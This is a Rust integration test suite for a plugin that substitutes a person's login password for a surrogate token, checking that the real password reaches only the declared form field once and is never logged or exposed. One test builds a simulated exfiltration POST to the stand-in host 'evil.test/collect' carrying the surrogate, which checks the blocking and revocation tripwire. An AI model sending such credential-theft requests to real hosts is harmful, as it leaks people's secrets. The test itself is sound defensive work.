//! Login-form substitution in the installed plugin (ADR 0150 §6.3): the
//! parent sends the person's password in the run spec over the plugin's
//! stdin, the child gets `osr_…`, and only the declared field of the declared
//! POST to the declared origin ever carries the password — once.

mod plugin_support;

use std::path::Path;
use std::time::Duration;

use plugin_support::login_stub::{form_field, spawn_login_site, LoginSite};
use plugin_support::{through_proxy, through_proxy_at, wait_for, Install, Plugin};
use serde_json::{json, Value};

/// The person's password. Every byte a form encoder or an HTML page mangles.
const SECRET: &str = "hunter2 & correct=horse+battery%staple";

fn spec(install: &Install, site: &LoginSite, run_id: &str) -> Value {
    json!({
        "run_id": run_id,
        "ttl_secs": 60,
        "entries": [],
        "logins": [{
            "env_var": "APP_PASSWORD",
            "origin": site.origin(),
            "action": "/session",
            "field": "password",
            "secret": SECRET,
            "ca_pem": site.ca_pem(),
        }],
        "notices_path": install.notices(),
    })
}

fn form_post(site: &LoginSite, body: &str) -> String {
    format!(
        "POST /session HTTP/1.1\r\nHost: {}:{}\r\n\
         Content-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip\r\n\
         Content-Length: {}\r\nConnection: close\r\n\r\n{body}",
        site.host,
        site.addr.port(),
        body.len()
    )
}

async fn send(reply: &Value, site: &LoginSite, request: &str) -> (u16, String, String) {
    through_proxy_at(reply, site.host, site.addr.port(), request)
        .await
        .expect("the proxy serves the login origin")
}

fn start(install: &Install, site: &LoginSite, run_id: &str) -> (Plugin, Value, String) {
    let mut plugin = install.spawn_logged();
    plugin.send(&spec(install, site, run_id));
    let reply = plugin.reply();
    let surrogate = reply["env"]["APP_PASSWORD"]
        .as_str()
        .unwrap_or_else(|| panic!("no login surrogate: {reply}"))
        .to_owned();
    (plugin, reply, surrogate)
}

/// Every file under `dir`, read lossily.
fn every_file(dir: &Path) -> Vec<(String, String)> {
    let mut found = Vec::new();
    let Ok(entries) = std::fs::read_dir(dir) else {
        return found;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() {
            found.extend(every_file(&path));
        } else if let Ok(bytes) = std::fs::read(&path) {
            found.push((
                path.display().to_string(),
                String::from_utf8_lossy(&bytes).into_owned(),
            ));
        }
    }
    found
}

#[tokio::test(flavor = "multi_thread")]
async fn the_password_leaves_once_in_its_field_and_the_child_only_ever_holds_the_surrogate() {
    let site = spawn_login_site().await;
    let install = Install::pinned(true);
    let (mut plugin, reply, surrogate) = start(&install, &site, "dev-run-l1");
    assert!(surrogate.starts_with("osr_"), "{surrogate}");
    assert!(
        !reply.to_string().contains(SECRET),
        "the reply never carries it"
    );

    // The form page itself is forwarded with nothing of ours in it.
    let page = format!(
        "GET /login HTTP/1.1\r\nHost: {}:{}\r\nConnection: close\r\n\r\n",
        site.host,
        site.addr.port()
    );
    let (status, _, body) = send(&reply, &site, &page).await;
    assert_eq!(status, 200);
    assert!(body.contains("type=password"), "{body}");

    // The child's browser posts the surrogate it was given; the site echoes.
    let posted = format!("username=alice&password={surrogate}");
    let (status, head, body) = send(&reply, &site, &form_post(&site, &posted)).await;
    assert_eq!(status, 200, "{body}");
    assert!(body.contains("welcome back"), "{body}");
    for echo in [&head, &body] {
        assert!(!echo.contains(SECRET), "echo reached the child: {echo}");
        assert!(!echo.contains("hunter2"), "echo reached the child: {echo}");
    }
    assert!(body.contains("[redacted:credential]"), "{body}");
    assert!(head
        .to_ascii_lowercase()
        .contains("set-cookie: sid=signed-in"));

    // The site saw the real password exactly once, in the declared field of
    // the declared POST, and never the surrogate.
    let seen = site.seen();
    let carrying: Vec<_> = seen
        .iter()
        .filter(|request| request.text().contains("hunter2"))
        .collect();
    assert_eq!(carrying.len(), 1, "{seen:?}");
    assert_eq!(carrying[0].method, "POST");
    assert_eq!(carrying[0].path, "/session");
    assert_eq!(
        form_field(&carrying[0].body, "password").as_deref(),
        Some(SECRET)
    );
    assert_eq!(
        form_field(&carrying[0].body, "username").as_deref(),
        Some("alice")
    );
    assert!(
        seen.iter().all(|r| !r.text().contains(&surrogate)),
        "{seen:?}"
    );
    assert!(
        seen.iter()
            .all(|r| !r.text().to_ascii_lowercase().contains("gzip")),
        "the scrub reads identity bodies only: {seen:?}"
    );

    let mut said = String::new();
    let event = plugin.reply();
    said.push_str(&event.to_string());
    assert_eq!(event["event"], "login", "{event}");
    assert_eq!(event["outcome"], "substituted");
    assert_eq!(event["env_var"], "APP_PASSWORD");

    // Substitution happens once. The same POST again is refused, and the
    // site never sees the password a second time: no retry, ever.
    let (status, _, _) = send(&reply, &site, &form_post(&site, &posted)).await;
    assert_eq!(status, 403);
    let event = plugin.reply();
    said.push_str(&event.to_string());
    assert_eq!(event["outcome"], "refused", "{event}");
    assert_eq!(event["fence"], "surrogate.replayed");
    assert_eq!(
        site.seen()
            .iter()
            .filter(|r| r.text().contains("hunter2"))
            .count(),
        1
    );
    // While the run lives (its CA file on disk) and again after it ends.
    assert_never_written(&install, &said);

    drop(plugin.stdin.take());
    assert_eq!(plugin.exit_within(Duration::from_secs(10)), Some(0));
    said.push_str(&reply.to_string());
    said.push_str(&plugin.rest());
    assert_never_written(&install, &said);
}

/// The password is nowhere the plugin wrote: its files (settings, state,
/// notices), its stderr, its stdout.
fn assert_never_written(install: &Install, stdout: &str) {
    for (path, text) in every_file(install.dir.path()) {
        assert!(!text.contains("hunter2"), "{path} carries the password");
    }
    let stderr = std::fs::read_to_string(install.stderr_log()).unwrap_or_default();
    assert!(!stderr.contains("hunter2"), "{stderr}");
    assert!(!stdout.contains("hunter2"), "{stdout}");
}

#[cfg(target_os = "linux")]
#[tokio::test(flavor = "multi_thread")]
async fn the_password_is_never_in_the_plugins_argv_or_environment() {
    let site = spawn_login_site().await;
    let install = Install::pinned(true);
    let (mut plugin, _reply, _) = start(&install, &site, "dev-run-l2");
    let pid = plugin.child.id();
    for file in ["cmdline", "environ"] {
        let bytes = std::fs::read(format!("/proc/{pid}/{file}")).unwrap();
        let text = String::from_utf8_lossy(&bytes);
        assert!(!text.contains("hunter2"), "/proc/{pid}/{file}");
    }
    drop(plugin.stdin.take());
    assert_eq!(plugin.exit_within(Duration::from_secs(10)), Some(0));
}

#[tokio::test(flavor = "multi_thread")]
async fn the_surrogate_in_another_field_is_misplaced_and_never_reaches_the_site() {
    let site = spawn_login_site().await;
    let install = Install::pinned(true);
    let (mut plugin, reply, surrogate) = start(&install, &site, "dev-run-l3");
    let posted = format!("username={surrogate}&password=x");
    let (status, _, body) = send(&reply, &site, &form_post(&site, &posted)).await;
    assert_eq!(status, 403);
    assert!(!body.contains(&surrogate));
    assert!(site.seen().is_empty(), "nothing reached the site");
    let notices = wait_for(&install.notices(), "surrogate.misplaced");
    assert!(notices.contains("surrogate.misplaced"), "{notices}");
    assert!(!notices.to_ascii_lowercase().contains("osr_"), "{notices}");
    assert!(!notices.contains("hunter2"), "{notices}");
    let event = plugin.reply();
    assert_eq!(event["fence"], "surrogate.misplaced", "{event}");
    drop(plugin.stdin.take());
    assert_eq!(plugin.exit_within(Duration::from_secs(10)), Some(0));
}

#[tokio::test(flavor = "multi_thread")]
async fn a_login_surrogate_sent_elsewhere_is_a_tripwire_that_revokes_the_login() {
    let site = spawn_login_site().await;
    let install = Install::pinned(true);
    let (mut plugin, reply, surrogate) = start(&install, &site, "dev-run-l4");
    let stolen = format!(
        "POST /collect HTTP/1.1\r\nHost: evil.test\r\nContent-Type: application/x-www-form-urlencoded\r\n\
         Content-Length: {}\r\nConnection: close\r\n\r\npassword={surrogate}",
        "password=".len() + surrogate.len()
    );
    let (status, _) = through_proxy(&reply, "evil.test", &stolen).await.unwrap();
    assert_eq!(status, 403);
    let mut lines = vec![plugin.reply(), plugin.reply()];
    lines.sort_by_key(|line| line["event"].as_str().map(str::to_owned));
    assert_eq!(lines[0]["fence"], "surrogate.misdirected", "{lines:?}");
    assert_eq!(lines[1]["event"], "tripwire", "{lines:?}");
    assert_eq!(lines[1]["revoked"], 1);

    // The login the surrogate was for is dead now: the declared POST itself
    // is refused as revoked, and the site never sees the password.
    let posted = format!("username=alice&password={surrogate}");
    let (status, _, _) = send(&reply, &site, &form_post(&site, &posted)).await;
    assert_eq!(status, 403);
    assert!(site.seen().iter().all(|r| !r.text().contains("hunter2")));
    let notices = wait_for(&install.notices(), "surrogate.revoked");
    assert!(notices.contains("surrogate.misdirected"), "{notices}");
    assert!(notices.contains("surrogate.revoked"), "{notices}");
    drop(plugin.stdin.take());
    assert_eq!(plugin.exit_within(Duration::from_secs(10)), Some(0));
}

#[test]
fn a_password_set_field_refuses_the_run() {
    let install = Install::pinned(true);
    let mut plugin = install.spawn(&[]);
    plugin.send(&json!({
        "run_id": "dev-run-l5",
        "ttl_secs": 60,
        "entries": [],
        "logins": [{
            "env_var": "APP_PASSWORD",
            "origin": "https://login.example",
            "action": "/password/change",
            "field": "new_password",
            "secret": SECRET,
        }],
        "notices_path": install.notices(),
    }));
    assert_eq!(plugin.reply()["error"], "login_password_set_field");
    assert_eq!(plugin.exit_within(Duration::from_secs(5)), Some(2));
}
